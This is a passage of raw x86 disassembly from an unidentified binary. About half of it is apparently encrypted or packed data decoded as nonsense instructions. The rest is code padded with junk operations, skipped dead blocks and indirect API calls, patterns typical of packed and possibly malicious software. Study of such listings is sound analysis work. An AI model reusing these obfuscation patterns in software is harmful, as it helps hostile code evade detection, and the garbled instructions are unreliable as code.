  415652:	and    eax,edx
  415654:	or     eax,0x1a40
  415659:	xor    eax,0x1ac1
  41565e:	add    ecx,eax
  415660:	mov    eax,DWORD PTR [ebp-0x18]
  415663:	mov    edx,0x7380
  415668:	sub    edx,eax
  41566a:	add    edx,DWORD PTR [ebp-0x1c]
  41566d:	jmp    0x4159c0
  415672:	pop    esp
  415673:	pushf  
  415674:	lds    eax,FWORD PTR [ebp+eax*2+0x1c]
  415678:	pop    esp
  415679:	pushf  
  41567a:	push   ss
  41567b:	cwde   
  41567c:	pop    ebx
  41567d:	jo     0x41562c
  41567f:	and    al,0x77
  415681:	jl     0x4156db
  415683:	or     BYTE PTR [esi],dl
  415685:	sbb    BYTE PTR [ebp+0x2f181812],dh
  41568b:	sub    eax,0xb53cde97
  415690:	pop    eax
  415691:	inc    edi
  415692:	aam    0x60
  415694:	cs jle 0x41567e
  415697:	push   edx
  415698:	jp     0x415628
  41569a:	cwde   
  41569b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41569c:	or     ecx,DWORD PTR [esp+ebx*2+0x27]
  4156a0:	dec    ebp
  4156a1:	or     eax,0x3426653d
  4156a6:	add    BYTE PTR [eax-0x76],dl
  4156a9:	mov    fs,WORD PTR [eax]
  4156ab:	dec    edi
  4156ac:	fsubr  QWORD PTR [edx]
  4156ae:	mov    dh,0x78
  4156b0:	repnz dec DWORD PTR [eax-0x5e]
  4156b4:	sbb    eax,0x5f575ba8
  4156b9:	mov    dh,0x84
  4156bb:	mov    bh,0x6e
  4156bd:	sub    eax,0x3ce90226
  4156c2:	adc    al,0x64
  4156c4:	jnp    0x4156b7
  4156c6:	mov    ?,WORD PTR ds:0x2f3872f5
  4156cc:	repnz and ch,BYTE PTR [edx-0x34]
  4156d0:	scas   eax,DWORD PTR es:[edi]
  4156d1:	je     0x4156d7
  4156d3:	xchg   ecx,eax
  4156d4:	gs sbb al,0x6e
  4156d7:	dec    esp
  4156d8:	xchg   ecx,eax
  4156d9:	xor    BYTE PTR [edx-0x3fef7133],ah
  4156df:	mov    al,0xd3
  4156e1:	fcmovnu st,st(7)
  4156e3:	in     al,dx
  4156e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4156e5:	xor    BYTE PTR [ecx-0x3305bc60],ah
  4156eb:	xchg   ebx,eax
  4156ec:	pop    edx
  4156ed:	ja     0x41571d
  4156ef:	jl     0x41570f
  4156f1:	out    0xed,al
  4156f3:	cmp    ch,BYTE PTR [bx+si+0x22]
  4156f7:	mov    WORD PTR ss:0xad4e7280,fs
  4156fe:	xchg   ebx,eax
  4156ff:	fsubr  QWORD PTR ds:0x2100a82a
  415705:	pop    ds
  415706:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415707:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415708:	mov    al,0x5d
  41570a:	mov    ds:0x9b2d2068,eax
  41570f:	sbb    al,0x81
  415711:	shr    BYTE PTR [eax+0x6b],cl
  415714:	sbb    edi,DWORD PTR [edi+ebp*1-0x4802f0bb]
  41571b:	or     dh,BYTE PTR [ebx+0x280de2b2]
  415721:	ficom  WORD PTR ds:0x3cf530ec
  415727:	stc    
  415728:	aaa    
  415729:	push   edi
  41572a:	mov    ah,0x67
  41572c:	mov    esi,0x89186809
  415731:	and    bl,BYTE PTR es:[eax+0x34417047]
  415738:	xchg   edx,eax
  415739:	and    eax,0xdfc2fae7
  41573e:	and    ebp,DWORD PTR [esi]
  415740:	fsub   st(2),st
  415742:	mov    DWORD PTR [ecx+edi*2],esp
  415745:	and    edi,0xc2251cc0
  41574b:	xchg   BYTE PTR [edi-0x25],ah
  41574e:	inc    esi
  41574f:	clc    
  415750:	pop    ds
  415751:	push   cs
  415752:	xor    BYTE PTR [edx+0x3b],0x3
  415756:	sahf   
  415757:	or     BYTE PTR [edx-0x195d6eab],bh
  41575d:	push   ss
  41575e:	mov    bh,0xd3
  415760:	cli    
  415761:	(bad)  
  415762:	lea    edi,ds:0x3e150d24
  415768:	mov    DWORD PTR [ebp-0x54],ecx
  41576b:	inc    ebx
  41576c:	jb     0x41576a
  41576e:	fnstcw WORD PTR [ecx-0x71b449b1]
  415774:	pusha  
  415775:	test   BYTE PTR [edi],dh
  415777:	leave  
  415778:	lods   eax,DWORD PTR ds:[esi]
  415779:	cld    
  41577a:	loope  0x4157d5
  41577c:	imul   ebp,esi,0x47f7cab6
  415782:	jnp    0x415770
  415784:	or     ch,BYTE PTR [edi]
  415786:	and    eax,0x5ed624d3
  41578b:	repz xchg edx,eax
  41578d:	retf   0x99f1
  415790:	cld    
  415791:	retf   
  415792:	and    BYTE PTR [ebx+0x39],bh
  415795:	ds mov edi,0x9851c82
  41579b:	mov    cl,0xf4
  41579d:	dec    edx
  41579e:	dec    ebx
  41579f:	leave  
  4157a0:	adc    ch,BYTE PTR [ecx+ebx*8+0x31]
  4157a4:	sbb    BYTE PTR [edi+0x6],al
  4157a7:	icebp  
  4157a8:	cs xor al,0xa2
  4157ab:	xchg   ebx,eax
  4157ac:	jecxz  0x4157e8
  4157ae:	addr16 aam 0x3b
  4157b1:	outs   dx,DWORD PTR ds:[esi]
  4157b2:	sahf   
  4157b3:	mov    ebx,0x751c1c38
  4157b8:	xlat   BYTE PTR ds:[ebx]
  4157b9:	and    al,0x18
  4157bb:	lds    edx,FWORD PTR [edx-0xa8e4719]
  4157c1:	or     edx,esp
  4157c3:	and    dl,BYTE PTR [edi+0x12]
  4157c6:	in     al,0x35
  4157c8:	pmaxsw mm2,QWORD PTR [edx-0x679f39e7]
  4157cf:	daa    
  4157d0:	adc    ebx,DWORD PTR [edi-0x58ec4bf8]
  4157d6:	leave  
  4157d7:	xor    ebp,DWORD PTR ds:0xca3fcd5f
  4157dd:	ja     0x415783
  4157df:	mov    bl,0x8
  4157e1:	and    DWORD PTR [ebp-0x1636aad0],eax
  4157e7:	mov    ebx,0x3c062efe
  4157ec:	(bad)  
  4157ed:	mov    dl,0xcf
  4157ef:	out    dx,al
  4157f0:	add    BYTE PTR [esi+0x18a07047],cl
  4157f6:	lods   al,BYTE PTR ds:[esi]
  4157f7:	dec    edi
  4157f8:	dec    ebx
  4157f9:	scas   al,BYTE PTR es:[edi]
  4157fa:	add    eax,0x16851f2e
  4157ff:	push   ebp
  415800:	and    BYTE PTR [ebp+0x62e23d8f],0xb3
  415807:	pushf  
  415808:	sbb    ah,BYTE PTR [eax-0x1de935bf]
  41580e:	mov    bh,0xea
  415810:	pushf  
  415811:	add    al,0xec
  415813:	jl     0x41582a
  415815:	xchg   esi,eax
  415816:	int3   
  415817:	in     eax,0xc8
  415819:	or     eax,0x2f33fcfe
  41581e:	xchg   eax,edi
  415820:	xor    BYTE PTR [edx+0x3a22e2a9],ch
  415826:	or     BYTE PTR [eax-0x7],al
  415829:	jno    0x415808
  41582b:	push   ebp
  41582c:	repnz sub al,0x63
  41582f:	out    0xec,al
  415831:	xchg   edx,eax
  415832:	and    eax,0x6bd5f587
  415837:	cs jmp ebp
  41583a:	or     DWORD PTR [edi+0x7d04f90e],edi
  415840:	adc    BYTE PTR [eax],ah
  415842:	into   
  415843:	arpl   WORD PTR [esi+edx*8],dx
  415846:	xchg   edi,eax
  415847:	aad    0xec
  415849:	fimul  DWORD PTR [ecx+0x3d]
  41584c:	xor    eax,0x9a951c9b
  415851:	fidiv  WORD PTR [edx-0x27]
  415854:	and    BYTE PTR es:[edx-0x3d],bh
  415858:	int    0xc4
  41585a:	xchg   esi,eax
  41585b:	mov    ah,BYTE PTR [edi]
  41585d:	jmp    0x10dd01ba
  415862:	adc    eax,0x1788f9ee
  415867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415868:	sbb    BYTE PTR [esi-0x150ba184],ch
  41586e:	mov    BYTE PTR [ebp-0x17b40c46],dl
  415874:	xchg   BYTE PTR [ecx],cl
  415876:	sar    DWORD PTR [edx-0x1d],1
  415879:	cdq    
  41587a:	or     BYTE PTR ds:0x13b55506,cl
  415880:	cli    
  415881:	pop    ecx
  415882:	push   0xe609a9cb
  415887:	(bad)  
  415888:	fistp  WORD PTR [ecx+0x2d]
  41588b:	enter  0xcadf,0xc1
  41588f:	pop    edx
  415890:	push   ds
  415891:	out    dx,al
  415892:	add    ebp,DWORD PTR [ebx+0x468d46f9]
  415898:	lods   al,BYTE PTR ds:[esi]
  415899:	dec    ecx
  41589a:	clc    
  41589b:	pop    esi
  41589c:	test   al,0xf2
  41589e:	inc    edx
  41589f:	push   esp
  4158a0:	jbe    0x41589f
  4158a2:	xchg   BYTE PTR [eax],bh
  4158a4:	loopne 0x4158fa
  4158a6:	hlt    
  4158a7:	mov    edi,DWORD PTR [ebp-0x30]
  4158aa:	in     eax,dx
  4158ab:	icebp  
  4158ac:	lds    ecx,FWORD PTR [eax-0x7]
  4158af:	dec    edi
  4158b0:	xor    ch,dl
  4158b2:	mov    ds:0xb2af806d,al
  4158b7:	cwde   
  4158b8:	into   
  4158b9:	in     eax,dx
  4158ba:	and    esp,ecx
  4158bc:	fdivr  DWORD PTR [edx-0x7787854f]
  4158c2:	push   ebx
  4158c3:	fdivrp st(7),st
  4158c5:	adc    DWORD PTR [ecx],ebp
  4158c7:	aad    0x30
  4158c9:	sahf   
  4158ca:	and    DWORD PTR [ecx],edi
  4158cc:	mov    BYTE PTR [eax+0x7b3c3564],al
  4158d2:	mov    esi,0xddbbc177
  4158d7:	fs mov ch,0x94
  4158da:	or     al,0xb8
  4158dc:	jnp    0x4158fe
  4158de:	bound  esi,QWORD PTR [ebp+0x4a]
  4158e1:	xor    eax,DWORD PTR fs:[esi]
  4158e4:	mov    ebp,0x52aeb131
  4158e9:	xor    BYTE PTR [eax+eiz*2],ah
  4158ec:	ror    BYTE PTR [edx],1
  4158ee:	es loope 0x415968
  4158f1:	mov    ah,0x22
  4158f3:	push   es
  4158f4:	fisubr DWORD PTR [edi]
  4158f6:	ins    DWORD PTR es:[edi],dx
  4158f7:	xchg   ebp,eax
  4158f8:	scas   al,BYTE PTR es:[edi]
  4158f9:	mov    BYTE PTR [eax],al
  4158fb:	and    ebp,DWORD PTR [esi]
  4158fd:	loope  0x4158ea
  4158ff:	in     al,0xed
  415901:	in     eax,0xe1
  415903:	test   BYTE PTR [ecx-0x3ee45c90],dh
  415909:	imul   eax
  41590b:	fs ja  0x415971
  41590e:	imul   edi,DWORD PTR [edi-0x53],0xffffffb6
  415912:	dec    ebp
  415913:	adc    ebp,ecx
  415915:	inc    ebp
  415916:	push   0xbfc00dcf
  41591b:	xlat   BYTE PTR ds:[ebx]
  41591c:	pop    edx
  41591d:	dec    edx
  41591e:	cmp    eax,0xe5712166
  415923:	rcl    ebp,0xf0
  415926:	cmp    DWORD PTR [edi+ebx*2+0x71],ecx
  41592a:	sub    ch,BYTE PTR [esi+esi*2-0x39]
  41592e:	mov    BYTE PTR [ebx+0x859c2be],ah
  415934:	in     eax,0x29
  415936:	ret    
  415937:	scas   al,BYTE PTR es:[edi]
  415938:	jo     0x41594c
  41593a:	stos   BYTE PTR es:[edi],al
  41593b:	out    0x93,al
  41593d:	rcr    BYTE PTR [eax-0x4b],cl
  415940:	push   ds
  415941:	dec    ebp
  415942:	out    0x81,al
  415944:	add    BYTE PTR [ebp-0x7b13b75f],dh
  41594a:	ficomp WORD PTR [eax+0x662aa346]
  415950:	xor    ebx,ecx
  415952:	pop    es
  415953:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415954:	(bad)
  415957:	out    dx,eax
  415958:	or     ebx,edi
  41595a:	in     eax,dx
  41595b:	lock and BYTE PTR [ebx+eiz*1],bh
  41595f:	gs mov edi,0xca69d122
  415965:	stos   DWORD PTR es:[edi],eax
  415966:	stos   BYTE PTR es:[edi],al
  415967:	jb     0x4159cf
  415969:	cwde   
  41596a:	add    BYTE PTR fs:[ebp+0x2f],bl
  41596e:	aaa    
  41596f:	push   es
  415970:	not    DWORD PTR [esi-0x54]
  415973:	mov    bh,0xb1
  415975:	cs pusha 
  415977:	sub    bh,BYTE PTR [ecx]
  415979:	(bad)  
  41597a:	sahf   
  41597b:	pushf  
  41597c:	cmc    
  41597d:	xor    cl,BYTE PTR [ebx]
  41597f:	fdivr  DWORD PTR [edx+0x9]
  415982:	mov    cl,0x2a
  415984:	or     edx,esp
  415986:	adc    BYTE PTR [edx],dh
  415988:	dec    edi
  415989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41598a:	xor    BYTE PTR [eax+esi*2-0x2eea2b96],ah
  415991:	xchg   ecx,eax
  415992:	stos   BYTE PTR es:[edi],al
  415993:	scas   al,BYTE PTR es:[edi]
  415994:	fst    DWORD PTR [esp+eiz*8-0x8]
  415998:	in     al,dx
  415999:	mul    bh
  41599b:	test   ecx,0x9adaebb3
  4159a1:	leave  
  4159a2:	mov    esi,0x1f0cc16f
  4159a7:	in     eax,0x53
  4159a9:	(bad)  
  4159aa:	dec    esp
  4159ab:	mov    edx,0xaba7dc37
  4159b0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159b1:	sar    BYTE PTR [ecx+0x6e],1
  4159b4:	add    BYTE PTR [edx],0x2e
  4159b7:	int3   
  4159b8:	cwde   
  4159b9:	jmp    0xb84e:0x40512c12
  4159c0:	mov    eax,DWORD PTR [ebp-0x20]
  4159c3:	xor    edx,eax
  4159c5:	mov    eax,DWORD PTR [ebp-0x24]
  4159c8:	and    edx,eax
  4159ca:	mov    eax,DWORD PTR [ebp+0x10]
  4159cd:	xor    edx,0x7015
  4159d3:	sub    eax,edx
  4159d5:	mov    edx,DWORD PTR [ebp-0x28]
  4159d8:	mov    esi,DWORD PTR [ebp-0x2c]
  4159db:	and    edx,0x2a7b
  4159e1:	lea    edx,[edx+esi*1-0x3571]
  4159e8:	mov    esi,DWORD PTR [ebp-0x30]
  4159eb:	shr    edx,1
  4159ed:	or     edx,esi
  4159ef:	mov    esi,ecx
  4159f1:	sub    esi,edx
  4159f3:	add    esi,0x4751
  4159f9:	cmp    esi,eax
  4159fb:	jbe    0x4152ac
  415a01:	pop    esi
  415a02:	leave  
  415a03:	ret    0xc
  415a06:	push   ebp
  415a07:	mov    ebp,esp
  415a09:	sub    esp,0x7c
  415a0c:	xor    DWORD PTR ds:0x4282ab,ebx
  415a12:	push   ebx
  415a13:	push   esi
  415a14:	push   edi
  415a15:	or     DWORD PTR ds:0x4283e7,0x412a
  415a1f:	mov    eax,DWORD PTR [ebp+0x8]
  415a22:	cmp    DWORD PTR ds:0x42827b,0x0
  415a29:	mov    ebx,0x3b8c
  415a2e:	mov    DWORD PTR ds:0x4281db,0x632c
  415a38:	jmp    0x415aab
  415a3d:	mov    edx,0x517f
  415a42:	mov    edi,DWORD PTR ds:0x42833f
  415a48:	cmp    DWORD PTR ds:0x42827b,0x0
  415a4f:	jae    0x415a95
  415a55:	push   DWORD PTR [ebp-0x14]
  415a58:	push   DWORD PTR [ebp-0x1c]
  415a5b:	push   DWORD PTR [ebp-0x18]
  415a5e:	push   DWORD PTR [ebp-0x18]
  415a61:	push   0x4a1d
  415a66:	push   0x1f83
  415a6b:	push   DWORD PTR [ebp-0x14]
  415a6e:	call   DWORD PTR ds:0x428f34
  415a74:	mov    edi,DWORD PTR ds:0x42820f
  415a7a:	xor    ecx,ecx
  415a7c:	or     ecx,DWORD PTR ds:0x42822f
  415a82:	sub    edi,ecx
  415a84:	imul   edi,DWORD PTR [edi+ecx*1]
  415a88:	movzx  edx,WORD PTR ds:0x4281c7
  415a8f:	and    DWORD PTR ds:0x4283f3,edx
  415a95:	xor    DWORD PTR ds:0x428293,0x17b
  415a9f:	sbb    DWORD PTR ds:0x428347,ecx
  415aa5:	adc    DWORD PTR ds:0x4281bb,edi
  415aab:	mov    ecx,DWORD PTR [ebp+0xc]
  415aae:	shrd   eax,ecx,0x2
  415ab2:	shr    ecx,0x2
  415ab5:	mov    ecx,DWORD PTR [ebp+0x8]
  415ab8:	and    edi,0x5809
  415abe:	mov    edx,DWORD PTR [ebp+0xc]
  415ac1:	mov    edi,DWORD PTR ds:0x4281c3
  415ac7:	xor    DWORD PTR ds:0x4282ef,edi
  415acd:	xor    edx,edx
  415acf:	xor    ebx,ebx
  415ad1:	xor    ebx,DWORD PTR ds:0x42823f
  415ad7:	xor    edi,edi
  415ad9:	or     edi,DWORD PTR ds:0x4282fb
  415adf:	sub    ebx,edi
  415ae1:	or     ebx,DWORD PTR [ebx+edi*1]
  415ae4:	mov    esi,0x329e695d
  415ae9:	xor    eax,esi
  415aeb:	adc    ebx,0x4305
  415af1:	or     eax,edx
  415af3:	mov    DWORD PTR [ebp-0x28],eax
  415af6:	not    edx
  415af8:	mov    eax,DWORD PTR [ebp+0x8]
  415afb:	sbb    DWORD PTR ds:0x4283d3,edx
  415b01:	shl    ecx,0x1e
  415b04:	mov    ecx,DWORD PTR [ebp+0xc]
  415b07:	shrd   eax,ecx,0x2
  415b0b:	adc    ebx,0x5b1c
  415b11:	xor    eax,esi
  415b13:	shr    ecx,0x2
  415b16:	sbb    DWORD PTR ds:0x42829f,ecx
  415b1c:	mov    ecx,DWORD PTR [ebp+0x8]
  415b1f:	mov    edi,DWORD PTR ds:0x42821f
  415b25:	mov    edx,DWORD PTR ds:0x42826f
  415b2b:	sub    edx,edi
  415b2d:	and    edi,DWORD PTR [edi+edx*1]
  415b30:	mov    edx,DWORD PTR [ebp+0xc]
  415b33:	cmp    DWORD PTR ds:0x4283df,0x0
  415b3a:	not    DWORD PTR ds:0x428363
  415b40:	mov    DWORD PTR ds:0x4282bb,0x4d0
  415b4a:	mov    DWORD PTR ds:0x4281b3,0x25d8
  415b54:	jmp    0x415ba8
  415b59:	mov    DWORD PTR ds:0x4283c3,0x25ca
  415b63:	cmp    DWORD PTR ds:0x4283df,0x0
  415b6a:	jge    0x415b90
  415b70:	push   DWORD PTR [ebp-0x28]
  415b73:	push   0x4281ab
  415b78:	push   0x12d6
  415b7d:	call   DWORD PTR ds:0x428ecc
  415b83:	add    DWORD PTR ds:0x4283bb,0x4989
  415b8d:	inc    edi
  415b8e:	add    edi,ebx
  415b90:	sbb    DWORD PTR ds:0x42836f,0x655f
  415b9a:	mov    ebx,DWORD PTR ds:0x42833b
  415ba0:	adc    DWORD PTR ds:0x428377,ebx
  415ba6:	xor    edi,edi
  415ba8:	xor    edx,edx
  415baa:	add    ebx,edi
  415bac:	or     eax,edx
  415bae:	cmp    DWORD PTR ds:0x4281cf,0x0
  415bb5:	mov    DWORD PTR ds:0x4281c7,0x74bf
  415bbf:	mov    DWORD PTR ds:0x428347,0x4195
  415bc9:	jmp    0x415c2e
  415bce:	mov    ebx,0x25c0
  415bd3:	mov    ebx,0x1763
  415bd8:	cmp    DWORD PTR ds:0x4281cf,0x0
  415bdf:	jl     0x415c13
  415be5:	push   0x432b
  415bea:	push   0x4282a7
  415bef:	call   DWORD PTR ds:0x428ed0
  415bf5:	sub    edi,DWORD PTR ds:0x4283f3
  415bfb:	sbb    DWORD PTR ds:0x428377,ecx
  415c01:	and    edx,DWORD PTR ds:0x4281e7
  415c07:	mov    edi,DWORD PTR ds:0x42828f
  415c0d:	and    DWORD PTR ds:0x4281cb,edi
  415c13:	or     DWORD PTR ds:0x4281c3,0x73d6
  415c1d:	mov    edi,DWORD PTR ds:0x4281f3
  415c23:	mov    edx,DWORD PTR ds:0x42837b
  415c29:	sub    edi,edx
  415c2b:	xor    edi,DWORD PTR [edi+edx*1]
  415c2e:	mov    DWORD PTR [ebp-0x28],eax
  415c31:	cmp    DWORD PTR ds:0x4283bf,0x0
  415c38:	mov    DWORD PTR ds:0x4283eb,ebx
  415c3e:	mov    DWORD PTR ds:0x4281bf,ecx
  415c44:	jmp    0x415cab
  415c49:	mov    DWORD PTR ds:0x4281db,edx
  415c4f:	cmp    DWORD PTR ds:0x4283bf,0x0
  415c56:	jbe    0x415ca1
  415c5c:	push   0x6725
  415c61:	push   0x42835b
  415c66:	push   0x8698
  415c6b:	push   0x6e02
  415c70:	push   0x538f
  415c75:	push   DWORD PTR [ebp-0x24]
  415c78:	push   0x8d72
  415c7d:	push   0x8325
  415c82:	call   DWORD PTR ds:0x428e20
  415c88:	mov    edi,DWORD PTR ds:0x428217
  415c8e:	mov    edx,DWORD PTR ds:0x42839f
  415c94:	sub    edi,edx
  415c96:	sub    edi,DWORD PTR [edi+edx*1]
  415c99:	add    DWORD PTR ds:0x428377,ebx
  415c9f:	or     edx,ebx
  415ca1:	add    edx,edi
  415ca3:	or     ebx,ebx
  415ca5:	and    ebx,DWORD PTR ds:0x42828f
  415cab:	mov    eax,ds:0x422428
  415cb0:	xor    edx,0x5bba
  415cb6:	mov    eax,DWORD PTR [eax]
  415cb8:	or     ebx,edx
  415cba:	mov    DWORD PTR [ebp-0xc],eax
  415cbd:	and    edi,0x77ac
  415cc3:	mov    eax,ds:0x422648
  415cc8:	mov    eax,DWORD PTR [eax]
  415cca:	cmp    DWORD PTR ds:0x4283db,0x0
  415cd1:	mov    edi,DWORD PTR ds:0x4282cb
  415cd7:	mov    ebx,DWORD PTR ds:0x4283f3
  415cdd:	mov    DWORD PTR ds:0x428293,0x6f52
  415ce7:	jmp    0x415d31
  415cec:	mov    DWORD PTR ds:0x4283cb,0x23d0
  415cf6:	cmp    DWORD PTR ds:0x4283db,0x0
  415cfd:	ja     0x415d21
  415d03:	push   DWORD PTR [ebp-0x18]
  415d06:	push   0x1c98
  415d0b:	push   DWORD PTR [ebp-0x1c]
  415d0e:	push   DWORD PTR [ebp-0xc]
  415d11:	call   DWORD PTR ds:0x428e24
  415d17:	or     ebx,edx
  415d19:	or     edx,edi
  415d1b:	adc    edi,0x39b9
  415d21:	and    edx,DWORD PTR ds:0x4282b7
  415d27:	sbb    edx,edi
  415d29:	add    edx,edi
  415d2b:	sbb    ebx,0x45bb
  415d31:	mov    DWORD PTR [ebp-0x10],eax
  415d34:	xor    DWORD PTR ds:0x4282cf,0x4282b3
  415d3e:	mov    eax,DWORD PTR [ebp-0xc]
  415d41:	sbb    DWORD PTR ds:0x42835f,0x4085
  415d4b:	mov    eax,DWORD PTR [ebp-0xc]
  415d4e:	mov    ebx,DWORD PTR [ebp+0x8]
  415d51:	cmp    DWORD PTR ds:0x428377,0x0
  415d58:	mov    DWORD PTR ds:0x4282d3,0x5216
  415d62:	not    DWORD PTR ds:0x4282ab
  415d68:	mov    edi,0x3d1c
  415d6d:	mov    DWORD PTR ds:0x4282cb,0x4705
  415d77:	jmp    0x415dc1
  415d7c:	mov    DWORD PTR ds:0x4282eb,ebx
  415d82:	cmp    DWORD PTR ds:0x428377,0x0
  415d89:	jg     0x415da3
  415d8f:	push   0x42810b
  415d94:	push   0x4280b9
  415d99:	call   DWORD PTR ds:0x428e28
  415d9f:	and    edx,edx
  415da1:	sub    edi,edi
  415da3:	xor    edx,edx
  415da5:	xor    edx,DWORD PTR ds:0x4282cf
  415dab:	sbb    DWORD PTR ds:0x4283f3,edx
  415db1:	or     DWORD PTR ds:0x4283d3,ebx
  415db7:	sbb    DWORD PTR ds:0x4282f3,0x12ba
  415dc1:	shl    ecx,0x1e
  415dc4:	xor    ecx,ecx
  415dc6:	adc    DWORD PTR ds:0x42836f,ecx
  415dcc:	shld   ecx,eax,0x2
  415dd0:	shl    eax,0x2
  415dd3:	mov    edi,0xca79a575
  415dd8:	mov    edx,0x9c1b89e8
  415ddd:	or     DWORD PTR ds:0x4281af,0x4c83
  415de7:	mov    DWORD PTR [ebp-0x38],ebx
  415dea:	mov    ebx,DWORD PTR [ebp+0xc]
  415ded:	xor    DWORD PTR ds:0x4281a7,0x6279
  415df7:	xor    eax,edi
  415df9:	sub    DWORD PTR ds:0x4281eb,0x4281b3
  415e03:	xor    ecx,edx
  415e05:	mov    DWORD PTR ds:0x4281eb,0x1398
  415e0f:	mov    DWORD PTR [ebp-0x1c],0xa4069bae
  415e16:	mov    DWORD PTR ds:0x4283bf,0x5e42
  415e20:	mov    DWORD PTR [ebp-0x18],0xa40692ae
  415e27:	mov    DWORD PTR [ebp-0x34],ebx
  415e2a:	mov    DWORD PTR ds:0x4282c7,0x218e
  415e34:	cmp    eax,DWORD PTR [ebp-0x38]
  415e37:	mov    DWORD PTR ds:0x4282f3,0x534
  415e41:	jne    0x415e59
  415e47:	mov    DWORD PTR ds:0x42829f,0x12af
  415e51:	cmp    ecx,ebx
  415e53:	je     0x416649
  415e59:	mov    eax,DWORD PTR [ebp-0x10]
  415e5c:	adc    DWORD PTR ds:0x4282cf,edx
  415e62:	mov    eax,DWORD PTR [ebp-0x10]
  415e65:	xor    ecx,ecx
  415e67:	shld   ecx,eax,0x2
  415e6b:	and    DWORD PTR ds:0x428357,0x4281df
  415e75:	shl    eax,0x2
  415e78:	xor    ecx,edx
  415e7a:	cmp    DWORD PTR ds:0x4281c3,0x0
  415e81:	not    edx
  415e83:	mov    DWORD PTR ds:0x42836f,edx
  415e89:	mov    edx,0x6413
  415e8e:	jmp    0x415f0c
  415e93:	mov    DWORD PTR ds:0x4281df,0x1988
  415e9d:	mov    DWORD PTR ds:0x4282e7,0x1d2b
  415ea7:	cmp    DWORD PTR ds:0x4281c3,0x0
  415eae:	je     0x415ee8
  415eb4:	push   0x6b61
  415eb9:	push   0x4c93
  415ebe:	call   DWORD PTR ds:0x428e2c
  415ec4:	or     DWORD PTR ds:0x428283,0x4f44
  415ece:	or     edx,0x2695
  415ed4:	sub    DWORD PTR ds:0x4283bb,0x174
  415ede:	mov    DWORD PTR ds:0x4283df,0x41a3
  415ee8:	mov    edx,DWORD PTR ds:0x4283db
  415eee:	add    edx,DWORD PTR ds:0x4281bf
  415ef4:	mov    DWORD PTR ds:0x4283db,edx
  415efa:	or     DWORD PTR ds:0x4283c7,ecx
  415f00:	mov    edx,DWORD PTR ds:0x428377
  415f06:	or     DWORD PTR ds:0x4282d7,edx
  415f0c:	mov    edx,DWORD PTR [ebp+0x8]
  415f0f:	xor    eax,edi
  415f11:	mov    DWORD PTR ds:0x4282e7,ecx
  415f17:	mov    edi,DWORD PTR [ebp+0xc]
  415f1a:	cmp    eax,edx
  415f1c:	jne    0x415f34
  415f22:	cmp    ecx,edi
  415f24:	mov    DWORD PTR ds:0x42836f,0x9a6
  415f2e:	je     0x416649
  415f34:	cmp    DWORD PTR ds:0x4281a3,0x0
  415f3b:	mov    DWORD PTR ds:0x4281c7,0x3be3
  415f45:	movzx  ebx,WORD PTR ds:0x4283c7
  415f4c:	not    edi
  415f4e:	jmp    0x415fba
  415f53:	mov    DWORD PTR ds:0x428367,ebx
  415f59:	cmp    DWORD PTR ds:0x4281a3,0x0
  415f60:	jne    0x415fad
  415f66:	push   0x3f61
  415f6b:	push   0x3f0f
  415f70:	push   DWORD PTR [ebp-0x18]
  415f73:	push   0x84fe
  415f78:	push   DWORD PTR [ebp-0x18]
  415f7b:	push   DWORD PTR [ebp-0x10]
  415f7e:	push   0x689e
  415f83:	push   DWORD PTR [ebp-0x18]
  415f86:	push   0x8af6
  415f8b:	call   DWORD PTR ds:0x428f38
  415f91:	xor    DWORD PTR ds:0x4283f7,edx
  415f97:	sbb    edi,DWORD PTR ds:0x4282d3
  415f9d:	sub    DWORD PTR ds:0x42828f,0x4f5e
  415fa7:	sub    ecx,DWORD PTR ds:0x4283cb
  415fad:	add    edi,0xe71
  415fb3:	dec    ecx
  415fb4:	and    ecx,DWORD PTR ds:0x428373
  415fba:	mov    eax,DWORD PTR [ebp-0x18]
  415fbd:	and    DWORD PTR ds:0x4283c3,ebx
  415fc3:	mov    ecx,DWORD PTR [ebp-0x18]
  415fc6:	push   0xfffffffe
  415fc8:	pop    ebx
  415fc9:	and    DWORD PTR ds:0x4281db,0xd25
  415fd3:	xor    ecx,ebx
  415fd5:	movzx  edi,BYTE PTR ds:0x4281db
  415fdc:	add    DWORD PTR ds:0x4282c3,edi
  415fe2:	shl    ecx,0x1e
  415fe5:	cmp    DWORD PTR ds:0x42828f,0x0
  415fec:	mov    DWORD PTR ds:0x4283e3,ecx
  415ff2:	mov    edi,0x37d1
  415ff7:	mov    DWORD PTR ds:0x4283f7,0x730b
  416001:	mov    edi,0x60e5
  416006:	jmp    0x416062
  41600b:	mov    DWORD PTR ds:0x4283c3,0x1cd3
  416015:	mov    DWORD PTR ds:0x4281bf,0x4bc0
  41601f:	cmp    DWORD PTR ds:0x42828f,0x0
  416026:	jg     0x41603f
  41602c:	push   0x1ec5
  416031:	call   DWORD PTR ds:0x428f3c
  416037:	add    DWORD PTR ds:0x4281c3,edx
  41603d:	neg    edi
  41603f:	mov    DWORD PTR ds:0x428367,0x2c32
  416049:	and    edi,DWORD PTR ds:0x42829f
  41604f:	and    edi,0x1973
  416055:	movzx  edi,WORD PTR ds:0x428297
  41605c:	adc    DWORD PTR ds:0x4282bb,edi
  416062:	mov    edi,0xa4069aaf
  416067:	and    DWORD PTR ds:0x4283eb,0x1058
  416071:	xor    eax,edi
  416073:	sub    DWORD PTR ds:0x428357,0x4282cf
  41607d:	shr    eax,0x2
  416080:	or     eax,ecx
  416082:	cmp    DWORD PTR ds:0x4281df,0x0
  416089:	mov    DWORD PTR ds:0x428377,0x1e83
  416093:	mov    DWORD PTR ds:0x4283d3,edx
  416099:	movzx  ecx,WORD PTR ds:0x4282ab
  4160a0:	jmp    0x4160ed
  4160a5:	not    ecx
  4160a7:	mov    ecx,DWORD PTR ds:0x4281e3
  4160ad:	cmp    DWORD PTR ds:0x4281df,0x0
  4160b4:	jg     0x4160e2
  4160ba:	push   DWORD PTR [ebp-0x20]
  4160bd:	push   DWORD PTR [ebp-0x18]
  4160c0:	call   DWORD PTR ds:0x428e30
  4160c6:	adc    DWORD PTR ds:0x42836b,edi
